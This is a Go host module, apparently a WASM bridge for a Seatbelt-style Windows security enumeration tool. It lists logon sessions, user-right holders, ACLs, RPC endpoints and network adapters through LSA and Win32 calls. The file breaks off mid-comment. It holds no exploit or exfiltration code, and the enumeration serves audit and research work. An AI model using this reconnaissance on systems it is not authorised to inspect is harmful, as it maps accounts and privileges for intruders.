//go:build nativeaot && windows

// NativeAOT-specific Win32 security host functions.
// SDDL retrieval, LSA enumeration, RPC endpoints, WMI queries.
// Only compiled when the "nativeaot" build tag is active.

package hostmod

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"github.com/tetratelabs/wazero/api"
	"golang.org/x/sys/windows"
)

var (
	modAdvapi32GetNamedSecurity                          = windows.NewLazyDLL("advapi32.dll").NewProc("GetNamedSecurityInfoW")
	modAdvapi32ConvertSecurityDescriptorToStringSecurity = windows.NewLazyDLL("advapi32.dll").NewProc("ConvertSecurityDescriptorToStringSecurityDescriptorW")
)

// win32EnumLogonSessions enumerates all logon sessions on the host and returns
// their fields as tab-separated "field\tvalue\n" lines, with sessions separated
// by a blank line (double newline). All struct layout arithmetic is performed
// natively on the host — no WASM pointer translation involved.
//
// The x64 SECURITY_LOGON_SESSION_DATA layout used here:
//
//	Offset 0:  Size (uint32)
//	Offset 4:  LoginID LUID (LowPart uint32 at +4, HighPart int32 at +8)
//	Offset 12: [4-byte pad]
//	Offset 16: Username (LSA_STRING_OUT: Length uint16 at +16, Buffer *uint16 at +24)
//	Offset 32: LoginDomain (same layout)
//	Offset 48: AuthenticationPackage (same layout)
//	Offset 64: LogonType (uint32)
//	Offset 68: Session (uint32)
//	Offset 72: PSiD (uintptr)
//	Offset 80: LoginTime (uint64 FILETIME)
//	Offset 88: LogonServer (LSA_STRING_OUT)
//	Offset 104: DnsDomainName (LSA_STRING_OUT)
//	Offset 120: Upn (LSA_STRING_OUT)
//
// outBufPtr/outBufLen: output buffer for the formatted records
// Returns: bytes written, or 0 on error.
func win32EnumLogonSessions(ctx context.Context, mod api.Module, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32EnumLogonSessions PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	secur32DLL, err := syscall.LoadDLL("secur32.dll")
	if err != nil {
		return 0
	}
	advapi32DLL, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return 0
	}

	find := func(dll *syscall.DLL, name string) *syscall.Proc {
		p, _ := dll.FindProc(name)
		return p
	}

	pLsaEnum := find(secur32DLL, "LsaEnumerateLogonSessions")
	pLsaGetData := find(secur32DLL, "LsaGetLogonSessionData")
	pLsaFree := find(secur32DLL, "LsaFreeReturnBuffer")
	pConvertSid := find(advapi32DLL, "ConvertSidToStringSidW")

	if pLsaEnum == nil || pLsaGetData == nil || pLsaFree == nil {
		return 0
	}

	// LsaEnumerateLogonSessions(&count, &luids)
	var count uint32
	var luidsPtr uintptr
	ret, _, _ := pLsaEnum.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luidsPtr)),
	)
	if ret != 0 || luidsPtr == 0 || count == 0 {
		return 0
	}
	defer pLsaFree.Call(luidsPtr)

	// LUID is two uint32 fields (8 bytes each).
	const luidSize = 8

	// readLSAString reads a LSA_STRING_OUT value from rawPtr.
	// LSA_STRING_OUT layout (x64): Length(uint16) at +0, Buffer(*uint16) at +8.
	readLSAString := func(rawPtr uintptr) string {
		length := *(*uint16)(unsafe.Pointer(rawPtr))
		bufPtr := *(*uintptr)(unsafe.Pointer(rawPtr + 8))
		if bufPtr == 0 || length == 0 {
			return ""
		}
		// length is in bytes; convert to uint16 count.
		charCount := uintptr(length) / 2
		utf16Slice := unsafe.Slice((*uint16)(unsafe.Pointer(bufPtr)), charCount)
		return windows.UTF16ToString(utf16Slice)
	}

	var buf []byte
	for i := uint32(0); i < count; i++ {
		func() {
		// Per-session recovery: sessions can be freed between
		// LsaEnumerateLogonSessions and LsaGetLogonSessionData (TOCTOU race).
		// A freed session pointer causes access violations in readLSAString.
		defer func() { recover() }()

		luidAddr := luidsPtr + uintptr(i)*luidSize

		var sessionDataPtr uintptr
		ret, _, _ = pLsaGetData.Call(luidAddr, uintptr(unsafe.Pointer(&sessionDataPtr)))
		if ret != 0 || sessionDataPtr == 0 {
			return
		}

		// Read fields at fixed x64 offsets.
		base := sessionDataPtr

		luidLow := *(*uint32)(unsafe.Pointer(base + 4))
		luidHigh := *(*int32)(unsafe.Pointer(base + 8))
		logonID := fmt.Sprintf("0x%x", uint64(luidHigh)<<32|uint64(luidLow))

		// Validate the session before reading fields. If the session was
		// freed between LsaEnumerateLogonSessions and LsaGetLogonSessionData,
		// the struct may contain stale/zero data. Skip if Size is implausible.
		structSize := *(*uint32)(unsafe.Pointer(base))
		if structSize == 0 || structSize > 4096 {
			pLsaFree.Call(sessionDataPtr)
			return
		}

		username := readLSAString(base + 16)
		domain := readLSAString(base + 32)
		authPkg := readLSAString(base + 48)
		logonType := *(*uint32)(unsafe.Pointer(base + 64))
		pSid := *(*uintptr)(unsafe.Pointer(base + 72))
		loginTime := *(*uint64)(unsafe.Pointer(base + 80))
		logonServer := readLSAString(base + 88)
		dnsDomain := readLSAString(base + 104)
		upn := readLSAString(base + 120)

		// Skip sessions with no meaningful identity data.
		if username == "" && domain == "" && pSid == 0 {
			pLsaFree.Call(sessionDataPtr)
			return
		}

		// Convert SID to string if present.
		sidStr := ""
		if pSid != 0 && pConvertSid != nil {
			var sidStrPtr *uint16
			pConvertSid.Call(pSid, uintptr(unsafe.Pointer(&sidStrPtr)))
			if sidStrPtr != nil {
				sidStr = windows.UTF16PtrToString(sidStrPtr)
				syscall.LocalFree(syscall.Handle(unsafe.Pointer(sidStrPtr)))
			}
		}

		// Append record: field\tvalue\n lines followed by a blank line separator.
		appendField := func(key, val string) {
			buf = append(buf, []byte(key+"\t"+val+"\n")...)
		}
		appendField("UserName", username)
		appendField("Domain", domain)
		appendField("LogonId", logonID)
		appendField("LuidLow", fmt.Sprintf("%d", luidLow))
		appendField("LuidHigh", fmt.Sprintf("%d", luidHigh))
		appendField("UserSID", sidStr)
		appendField("AuthPackage", authPkg)
		appendField("LogonType", fmt.Sprintf("%d", logonType))
		appendField("LogonTime", fmt.Sprintf("%d", loginTime))
		appendField("LogonServer", logonServer)
		appendField("DnsDomainName", dnsDomain)
		appendField("UPN", upn)
		buf = append(buf, '\x00') // NUL byte between sessions (matches C# parser)

		pLsaFree.Call(sessionDataPtr)
		}() // end per-session func with recover
	}

	if len(buf) == 0 {
		return 0
	}
	if uint32(len(buf)) > outBufLen {
		buf = buf[:outBufLen]
	}
	writeBytes(mod, outBufPtr, buf)
	return uint32(len(buf))
}

// win32ParseSddlAcl parses an SDDL string into ACE entries with translated
// account names. Replaces .NET's RawSecurityDescriptor + SecurityIdentifier.Translate()
// which throw PlatformNotSupportedException on NativeAOT-WASI.
//
// sddlPtr/sddlLen: UTF-8 SDDL string in WASM memory
// outBufPtr/outBufLen: output buffer for null-separated "account_name\tSID\taccess_type" lines
// Returns: bytes written, or 0 on error.
func win32ParseSddlAcl(ctx context.Context, mod api.Module, sddlPtr, sddlLen, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32ParseSddlAcl PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	sddlBytes, ok := readBytes(mod, sddlPtr, sddlLen)
	if !ok || len(sddlBytes) == 0 {
		return 0
	}
	sddlStr := string(sddlBytes)

	advapi32DLL, err := syscall.LoadDLL("advapi32.dll")
	if err != nil {
		return 0
	}
	kernel32DLL, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0
	}

	findProc := func(dll *syscall.DLL, name string) *syscall.Proc {
		p, _ := dll.FindProc(name)
		return p
	}

	pConvertSddlToSD := findProc(advapi32DLL, "ConvertStringSecurityDescriptorToSecurityDescriptorW")
	pGetSecurityDescriptorDacl := findProc(advapi32DLL, "GetSecurityDescriptorDacl")
	pGetAclInformation := findProc(advapi32DLL, "GetAclInformation")
	pGetAce := findProc(advapi32DLL, "GetAce")
	pLookupAccountSid := findProc(advapi32DLL, "LookupAccountSidW")
	pConvertSidToStringSid := findProc(advapi32DLL, "ConvertSidToStringSidW")
	pLocalFree := findProc(kernel32DLL, "LocalFree")

	if pConvertSddlToSD == nil || pGetSecurityDescriptorDacl == nil ||
		pGetAclInformation == nil || pGetAce == nil ||
		pLookupAccountSid == nil || pConvertSidToStringSid == nil || pLocalFree == nil {
		return 0
	}

	// ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &pSD, NULL)
	sddlUTF16, err := syscall.UTF16PtrFromString(sddlStr)
	if err != nil {
		return 0
	}
	const sddlRevision1 = 1
	var pSD uintptr
	ret, _, _ := pConvertSddlToSD.Call(
		uintptr(unsafe.Pointer(sddlUTF16)),
		sddlRevision1,
		uintptr(unsafe.Pointer(&pSD)),
		0,
	)
	if ret == 0 || pSD == 0 {
		return 0
	}
	defer pLocalFree.Call(pSD)

	// GetSecurityDescriptorDacl(pSD, &daclPresent, &pDacl, &daclDefaulted)
	var daclPresent, daclDefaulted uint32
	var pDacl uintptr
	ret, _, _ = pGetSecurityDescriptorDacl.Call(
		pSD,
		uintptr(unsafe.Pointer(&daclPresent)),
		uintptr(unsafe.Pointer(&pDacl)),
		uintptr(unsafe.Pointer(&daclDefaulted)),
	)
	if ret == 0 || daclPresent == 0 || pDacl == 0 {
		return 0
	}

	// GetAclInformation to get ACE count.
	// ACL_SIZE_INFORMATION: AceCount(uint32) + AclBytesInUse(uint32) + AclBytesFree(uint32)
	type aclSizeInfo struct {
		AceCount      uint32
		AclBytesInUse uint32
		AclBytesFree  uint32
	}
	const aclSizeInfoClass = 2
	var aclInfo aclSizeInfo
	ret, _, _ = pGetAclInformation.Call(
		pDacl,
		uintptr(unsafe.Pointer(&aclInfo)),
		unsafe.Sizeof(aclInfo),
		aclSizeInfoClass,
	)
	if ret == 0 || aclInfo.AceCount == 0 {
		return 0
	}

	var buf []byte
	for i := uint32(0); i < aclInfo.AceCount; i++ {
		var pAce uintptr
		ret, _, _ = pGetAce.Call(pDacl, uintptr(i), uintptr(unsafe.Pointer(&pAce)))
		if ret == 0 || pAce == 0 {
			continue
		}

		// ACE_HEADER: type(uint8) + flags(uint8) + size(uint16)
		aceType := *(*uint8)(unsafe.Pointer(pAce))
		accessType := "ACCESS_ALLOWED"
		if aceType == 1 {
			accessType = "ACCESS_DENIED"
		}

		// SID starts at offset 8 (after ACE_HEADER(4) + AccessMask(4))
		sidPtr := pAce + 8

		// LookupAccountSidW to get account name and domain.
		var nameLen, domainLen, sidUse uint32
		nameLen = 256
		domainLen = 256
		nameBuf := make([]uint16, nameLen)
		domainBuf := make([]uint16, domainLen)
		ret, _, _ = pLookupAccountSid.Call(
			0, // local machine
			sidPtr,
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
			uintptr(unsafe.Pointer(&domainBuf[0])),
			uintptr(unsafe.Pointer(&domainLen)),
			uintptr(unsafe.Pointer(&sidUse)),
		)

		accountName := ""
		if ret != 0 {
			domain := windows.UTF16ToString(domainBuf[:domainLen])
			name := windows.UTF16ToString(nameBuf[:nameLen])
			if domain != "" {
				accountName = domain + "\\" + name
			} else {
				accountName = name
			}
		}

		// ConvertSidToStringSidW to get the SID string.
		var sidStrPtr *uint16
		pConvertSidToStringSid.Call(sidPtr, uintptr(unsafe.Pointer(&sidStrPtr)))
		sidString := ""
		if sidStrPtr != nil {
			sidString = windows.UTF16PtrToString(sidStrPtr)
			syscall.LocalFree(syscall.Handle(unsafe.Pointer(sidStrPtr)))
		}

		if accountName == "" && sidString == "" {
			continue
		}

		line := accountName + "\t" + sidString + "\t" + accessType + "\x00"
		buf = append(buf, []byte(line)...)
	}

	if len(buf) == 0 {
		return 0
	}
	if uint32(len(buf)) > outBufLen {
		buf = buf[:outBufLen]
	}
	writeBytes(mod, outBufPtr, buf)
	return uint32(len(buf))
}

// win32GetSddl retrieves the SDDL string for a file/directory path.
// Combines GetNamedSecurityInfoW + ConvertSecurityDescriptorToStringSecurityDescriptorW
// in a single host call, avoiding expensive mirror table traversal for
// SECURITY_DESCRIPTOR structures with deep ACL/SID pointer chains.
//
// pathPtr: WASM pointer to UTF-16 null-terminated path
// outBufPtr: WASM pointer to output buffer for UTF-16 SDDL string
// outBufLen: output buffer capacity in bytes
// Returns: number of UTF-16 chars written, or 0 on error
func win32GetSddl(ctx context.Context, mod api.Module, pathPtr, outBufPtr, outBufLen uint32) uint32 {
	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	// Read path from WASM memory (UTF-16 null-terminated).
	mem := mod.Memory()
	if mem == nil {
		return 0
	}

	// Find null terminator in the UTF-16 path.
	var pathLen uint32
	for off := uint32(0); off < 2048; off += 2 {
		b, ok := mem.Read(pathPtr+off, 2)
		if !ok || (b[0] == 0 && b[1] == 0) {
			pathLen = off
			break
		}
	}
	if pathLen == 0 {
		return 0
	}

	pathBytes, ok := mem.Read(pathPtr, pathLen+2) // include null terminator
	if !ok {
		return 0
	}
	pathUTF16 := (*uint16)(unsafe.Pointer(&pathBytes[0]))

	// GetNamedSecurityInfoW
	const (
		seFileObject              = 1
		ownerSecurityInformation  = 0x1
		daclSecurityInformation   = 0x4
	)
	var pSD uintptr
	ret, _, _ := modAdvapi32GetNamedSecurity.Call(
		uintptr(unsafe.Pointer(pathUTF16)),
		seFileObject,
		ownerSecurityInformation|daclSecurityInformation,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&pSD)),
	)
	if ret != 0 || pSD == 0 {
		return 0
	}
	defer syscall.LocalFree(syscall.Handle(pSD))

	// ConvertSecurityDescriptorToStringSecurityDescriptorW
	const sddlRevision1 = 1
	var sddlStr *uint16
	ret, _, _ = modAdvapi32ConvertSecurityDescriptorToStringSecurity.Call(
		pSD,
		sddlRevision1,
		ownerSecurityInformation|daclSecurityInformation,
		uintptr(unsafe.Pointer(&sddlStr)),
		0,
	)
	if ret == 0 || sddlStr == nil {
		return 0
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(sddlStr)))

	// Measure SDDL string length.
	sddlLen := uint32(0)
	for p := sddlStr; *p != 0; p = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(p)) + 2)) {
		sddlLen++
	}

	byteLen := sddlLen * 2
	if byteLen > outBufLen {
		return 0 // buffer too small
	}

	// Copy UTF-16 SDDL to WASM output buffer.
	sddlBytes := unsafe.Slice((*byte)(unsafe.Pointer(sddlStr)), byteLen)
	if !writeBytes(mod, outBufPtr, sddlBytes) {
		return 0
	}

	return sddlLen
}

// win32EnumUserRights enumerates accounts with each user right assignment.
// Combines LsaOpenPolicy + LsaEnumerateAccountsWithUserRight + ConvertSidToStringSid
// in a single host call, avoiding LSA_UNICODE_STRING x64/wasm32 struct layout issues.
//
// outBufPtr: WASM buffer for results (null-separated "Right\tSID" lines)
// outBufLen: buffer capacity in bytes
// Returns: bytes written, or 0 on error.
func win32EnumUserRights(ctx context.Context, mod api.Module, outBufPtr, outBufLen uint32) uint32 {
	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	modAdvapi32 := windows.NewLazyDLL("advapi32.dll")
	pLsaOpenPolicy := modAdvapi32.NewProc("LsaOpenPolicy")
	pLsaEnumAccts := modAdvapi32.NewProc("LsaEnumerateAccountsWithUserRight")
	pLsaClose := modAdvapi32.NewProc("LsaClose")
	pLsaFreeMemory := modAdvapi32.NewProc("LsaFreeMemory")

	// LsaOpenPolicy(NULL, &attrs, POLICY_LOOKUP_NAMES|POLICY_VIEW_LOCAL, &handle)
	type lsaObjectAttrs struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	var attrs lsaObjectAttrs
	attrs.Length = uint32(unsafe.Sizeof(attrs))

	var policyHandle uintptr
	const policyLookupNames = 0x00000800
	const policyViewLocal = 0x00000001
	ret, _, _ := pLsaOpenPolicy.Call(0, uintptr(unsafe.Pointer(&attrs)),
		policyLookupNames|policyViewLocal, uintptr(unsafe.Pointer(&policyHandle)))
	if ret != 0 || policyHandle == 0 {
		return 0
	}
	defer pLsaClose.Call(policyHandle)

	// Known user rights to enumerate
	rights := []string{
		"SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
		"SeBatchLogonRight", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
		"SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege",
		"SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege",
		"SeDenyBatchLogonRight", "SeDenyInteractiveLogonRight",
		"SeDenyNetworkLogonRight", "SeDenyRemoteInteractiveLogonRight",
		"SeDenyServiceLogonRight", "SeEnableDelegationPrivilege",
		"SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
		"SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege",
		"SeInteractiveLogonRight", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
		"SeMachineAccountPrivilege", "SeManageVolumePrivilege",
		"SeNetworkLogonRight", "SeProfileSingleProcessPrivilege",
		"SeRelabelPrivilege", "SeRemoteInteractiveLogonRight",
		"SeRemoteShutdownPrivilege", "SeRestorePrivilege",
		"SeSecurityPrivilege", "SeServiceLogonRight", "SeShutdownPrivilege",
		"SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
		"SeSystemProfilePrivilege", "SeSystemtimePrivilege",
		"SeTakeOwnershipPrivilege", "SeTcbPrivilege",
		"SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
		"SeUndockPrivilege",
	}

	type lsaUnicodeString struct {
		Length        uint16
		MaximumLength uint16
		Buffer        *uint16
	}

	pConvertSid := modAdvapi32.NewProc("ConvertSidToStringSidW")

	var buf []byte
	for _, right := range rights {
		rightUTF16, _ := syscall.UTF16PtrFromString(right)
		rightLen := uint16(len(right) * 2)
		lusRight := lsaUnicodeString{
			Length:        rightLen,
			MaximumLength: rightLen + 2,
			Buffer:        rightUTF16,
		}

		var enumBuf uintptr
		var count uint32
		ret, _, _ = pLsaEnumAccts.Call(policyHandle,
			uintptr(unsafe.Pointer(&lusRight)),
			uintptr(unsafe.Pointer(&enumBuf)),
			uintptr(unsafe.Pointer(&count)))
		if ret != 0 || enumBuf == 0 || count == 0 {
			continue
		}

		type lsaEnumInfo struct {
			Sid uintptr
		}
		for i := uint32(0); i < count; i++ {
			info := (*lsaEnumInfo)(unsafe.Pointer(enumBuf + uintptr(i)*unsafe.Sizeof(lsaEnumInfo{})))
			if info.Sid == 0 {
				continue
			}
			var sidStr *uint16
			pConvertSid.Call(info.Sid, uintptr(unsafe.Pointer(&sidStr)))
			if sidStr == nil {
				continue
			}
			sid := windows.UTF16PtrToString(sidStr)
			syscall.LocalFree(syscall.Handle(unsafe.Pointer(sidStr)))

			line := right + "\t" + sid + "\x00"
			buf = append(buf, []byte(line)...)
		}
		pLsaFreeMemory.Call(enumBuf)
	}

	if len(buf) == 0 {
		return 0
	}
	if uint32(len(buf)) > outBufLen {
		buf = buf[:outBufLen]
	}
	writeBytes(mod, outBufPtr, buf)
	return uint32(len(buf))
}

// win32EnumRPCEndpoints enumerates RPC mapped endpoints via the RPC runtime.
// Combines RpcStringBindingCompose + RpcBindingFromStringBinding + RpcMgmtEpEltInqBegin/Next.
// Returns endpoint data as null-separated "Protocol\tEndpoint\tAnnotation\tUUID" lines.
func win32EnumRPCEndpoints(ctx context.Context, mod api.Module, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32EnumRPCEndpoints PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	rpcrt4DLL, err := syscall.LoadDLL("rpcrt4.dll")
	if err != nil {
		return 0
	}
	find := func(name string) *syscall.Proc {
		p, _ := rpcrt4DLL.FindProc(name)
		return p
	}
	pCompose := find("RpcStringBindingComposeW")
	pBindFrom := find("RpcBindingFromStringBindingW")
	pInqBegin := find("RpcMgmtEpEltInqBegin")
	// Try both non-W and W variants — different Windows versions export different names
	pInqNext := find("RpcMgmtEpEltInqNext")
	if pInqNext == nil {
		pInqNext = find("RpcMgmtEpEltInqNextW")
	}
	pInqDone := find("RpcMgmtEpEltInqDone")
	pBindToStr := find("RpcBindingToStringBindingW")
	pBindFree := find("RpcBindingFree")
	pStrFree := find("RpcStringFreeW")
	if pCompose == nil || pBindFrom == nil || pInqBegin == nil || pInqNext == nil {
		mirrorDebugLog("win32EnumRPCEndpoints: missing RPC procs: compose=%v bindFrom=%v inqBegin=%v inqNext=%v",
			pCompose != nil, pBindFrom != nil, pInqBegin != nil, pInqNext != nil)
		return 0
	}

	// RpcStringBindingCompose(NULL, "ncacn_ip_tcp", NULL, NULL, NULL, &stringBinding)
	protSeq, _ := syscall.UTF16PtrFromString("ncacn_ip_tcp")
	var stringBinding *uint16
	ret, _, _ := pCompose.Call(0, uintptr(unsafe.Pointer(protSeq)), 0, 0, 0,
		uintptr(unsafe.Pointer(&stringBinding)))
	if ret != 0 || stringBinding == nil {
		return 0
	}
	defer pStrFree.Call(uintptr(unsafe.Pointer(&stringBinding)))

	var bindingHandle uintptr
	ret, _, _ = pBindFrom.Call(uintptr(unsafe.Pointer(stringBinding)),
		uintptr(unsafe.Pointer(&bindingHandle)))
	mirrorDebugLog("win32EnumRPCEndpoints: Compose OK, BindFrom ret=%d handle=%d", ret, bindingHandle)
	if ret != 0 || bindingHandle == 0 {
		mirrorDebugLog("win32EnumRPCEndpoints: RpcBindingFromStringBinding failed ret=%d", ret)
		return 0
	}
	defer pBindFree.Call(uintptr(unsafe.Pointer(&bindingHandle)))

	// RPC_IF_ID structure: UUID(16) + MajorVersion(2) + MinorVersion(2) = 20 bytes
	type rpcIfId struct {
		UUID         [16]byte
		MajorVersion uint16
		MinorVersion uint16
	}

	var inquiryContext uintptr
	ret, _, _ = pInqBegin.Call(bindingHandle, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&inquiryContext)))
	if ret != 0 || inquiryContext == 0 {
		mirrorDebugLog("win32EnumRPCEndpoints: RpcMgmtEpEltInqBegin failed ret=%d", ret)
		return 0
	}
	defer pInqDone.Call(uintptr(unsafe.Pointer(&inquiryContext)))

	var buf []byte
	for i := 0; i < 10000; i++ {
		var ifId rpcIfId
		var elementBinding uintptr
		var elementAnnotation *uint16

		status, _, _ := pInqNext.Call(inquiryContext,
			uintptr(unsafe.Pointer(&ifId)),
			uintptr(unsafe.Pointer(&elementBinding)),
			0,
			uintptr(unsafe.Pointer(&elementAnnotation)))
		if status != 0 {
			break
		}

		// Get the binding string for this element
		var bindStr *uint16
		pBindToStr.Call(elementBinding, uintptr(unsafe.Pointer(&bindStr)))

		binding := ""
		if bindStr != nil {
			binding = windows.UTF16PtrToString(bindStr)
			pStrFree.Call(uintptr(unsafe.Pointer(&bindStr)))
		}

		annotation := ""
		if elementAnnotation != nil {
			annotation = windows.UTF16PtrToString(elementAnnotation)
		}

		uuid := fmt.Sprintf("%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
			*(*uint32)(unsafe.Pointer(&ifId.UUID[0])),
			*(*uint16)(unsafe.Pointer(&ifId.UUID[4])),
			*(*uint16)(unsafe.Pointer(&ifId.UUID[6])),
			ifId.UUID[8], ifId.UUID[9],
			ifId.UUID[10], ifId.UUID[11], ifId.UUID[12],
			ifId.UUID[13], ifId.UUID[14], ifId.UUID[15])

		line := fmt.Sprintf("%s\t%s\t%s\tv%d.%d\x00",
			binding, uuid, annotation, ifId.MajorVersion, ifId.MinorVersion)
		buf = append(buf, []byte(line)...)

		if elementBinding != 0 {
			pBindFree.Call(uintptr(unsafe.Pointer(&elementBinding)))
		}
	}

	if len(buf) == 0 {
		return 0
	}
	if uint32(len(buf)) > outBufLen {
		buf = buf[:outBufLen]
	}
	writeBytes(mod, outBufPtr, buf)
	return uint32(len(buf))
}

// win32EnumNetworkAdapters enumerates network adapters using GetAdaptersInfo
// and returns their properties as tab-separated records. Each adapter produces
// one line of the form:
//
//	index\tname\tdescription\tip1,ip2,...\n
//
// where "name" is the AdapterName (GUID-style), "description" is human-readable,
// and the IP list is comma-separated IPv4 addresses. DNS server data is not
// available via GetAdaptersInfo; callers that need DNS must query the registry.
//
// Replaces NetworkInterface.GetAllNetworkInterfaces() which throws
// PlatformNotSupportedException on NativeAOT-WASI.
//
// outBufPtr/outBufLen: output buffer for the formatted records.
// Returns: bytes written, or 0 on error.
func win32EnumNetworkAdapters(ctx context.Context, mod api.Module, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32EnumNetworkAdapters PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	// First call: get required buffer size.
	var size uint32
	err := windows.GetAdaptersInfo(nil, &size)
	if err != nil && err != windows.ERROR_BUFFER_OVERFLOW {
		return 0
	}
	if size == 0 {
		return 0
	}

	// Allocate buffer and populate adapter list.
	buf := make([]byte, size)
	ai := (*windows.IpAdapterInfo)(unsafe.Pointer(&buf[0]))
	err = windows.GetAdaptersInfo(ai, &size)
	if err != nil {
		return 0
	}

	// extractBytes converts a fixed null-terminated byte array to a Go string.
	extractBytes := func(b []byte) string {
		for i, c := range b {
			if c == 0 {
				return string(b[:i])
			}
		}
		return string(b)
	}

	// collectIPs walks the IpAddrString linked list and returns a comma-joined
	// list of non-empty IP address strings.
	collectIPs := func(head *windows.IpAddrString) string {
		var ips []string
		for cur := head; cur != nil; cur = cur.Next {
			ip := extractBytes(cur.IpAddress.String[:])
			if ip != "" && ip != "0.0.0.0" {
				ips = append(ips, ip)
			}
		}
		if len(ips) == 0 {
			return ""
		}
		out := ips[0]
		for _, ip := range ips[1:] {
			out += "," + ip
		}
		return out
	}

	var out []byte
	for adapter := ai; adapter != nil; adapter = adapter.Next {
		name := extractBytes(adapter.AdapterName[:])
		desc := extractBytes(adapter.Description[:])
		ipList := collectIPs(&adapter.IpAddressList)
		index := adapter.Index

		line := fmt.Sprintf("%d\t%s\t%s\t%s\n", index, name, desc, ipList)
		out = append(out, []byte(line)...)
	}

	if len(out) == 0 {
		return 0
	}
	if uint32(len(out)) > outBufLen {
		out = out[:outBufLen]
	}
	writeBytes(mod, outBufPtr, out)
	return uint32(len(out))
}

// win32GetFileVersionInfo retrieves the CompanyName from a PE file's
// VERSIONINFO resource. Used by the Services command to filter Microsoft
// services (native Seatbelt checks FileVersionInfo.CompanyName, not path
// strings). Returns the CompanyName as a UTF-8 string in the output buffer.
//
// pathPtr/pathLen: UTF-8 file path in WASM memory
// outBufPtr/outBufLen: output buffer for the CompanyName string
// Returns: bytes written, or 0 on error.
func win32GetFileVersionInfo(ctx context.Context, mod api.Module, pathPtr, pathLen, outBufPtr, outBufLen uint32) (result uint32) {
	defer func() {
		if r := recover(); r != nil {
			mirrorDebugLog("win32GetFileVersionInfo PANIC: %v", r)
			result = 0
		}
	}()

	cfg := getConfig(ctx)
	if cfg == nil || !cfg.Win32APIs {
		return 0
	}

	pathBytes, ok := readBytes(mod, pathPtr, pathLen)
	if !ok || len(pathBytes) == 0 {
		return 0
	}
	path := string(pathBytes)

	versionDLL, err := syscall.LoadDLL("version.dll")
	if err != nil {
		return 0
	}

	find := func(name string) *syscall.Proc {
		p, _ := versionDLL.FindProc(name)
		return p
	}

	pGetFileVersionInfoSizeW := find("GetFileVersionInfoSizeW")
	pGetFileVersionInfoW := find("GetFileVersionInfoW")
	pVerQueryValueW := find("VerQueryValueW")

	if pGetFileVersionInfoSizeW == nil || pGetFileVersionInfoW == nil || pVerQueryValueW == nil {
		return 0
	}

	pathUTF16, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return 0
	}

	var dummy uint32
	size, _, _ := pGetFileVersionInfoSizeW.Call(
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(unsafe.Pointer(&dummy)),
	)
	if size == 0 {
		return 0
	}

	infoBuf := make([]byte, size)
	ret, _, _ := pGetFileVersionInfoW.Call(
		uintptr(unsafe.Pointer(pathUTF16)),
		0,
		size,
		uintptr(unsafe.Pointer(&infoBuf[0])),
	)
	if ret == 0 {
		return 0
	}

	// Try language-specific sub-blocks. Try en-US Unicode (040904B0) first,
	// then en-US codepage (040904E4), then fall back to the first entry.
	subBlocks := []string{
		`\StringFileInfo\040904B0\CompanyName`,
		`\StringFileInfo\040904E4\CompanyName`,
		`\StringFileInfo\040904b0\CompanyName`,
	}

	for _, sub := range subBlocks {
		subUTF16, err := syscall.UTF16PtrFromString(sub)
		if err != nil {
			continue
		}
		var pValue uintptr
		var valueLen uint32
		ret, _, _ = pVerQueryValueW.Call(
			uintptr(unsafe.Pointer(&infoBuf[0])),
			uintptr(unsafe.Pointer(subUTF16)),
			uintptr(unsafe.Pointer(&pValue)),
			uintptr(unsafe.Pointer(&valueLen)),
		)
		if ret == 0 || pValue == 0 || valueLen == 0 {
			continue
		}
		companyName := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pValue)))
		if companyName == "" {
			continue
		}
		out := []byte(companyName)
		if uint32(len(out)) > outBufLen {
			out = out[:outBufLen]
		}
		writeBytes(mod, outBufPtr, out)
		return uint32(len(out))
	}

	return 0
}

// runOnLockedThread executes fn on a dedicated OS thread (via
// runtime.LockOSThread) without COM apartment initialization.
// This is used for LSA operations that need a stable OS thread for
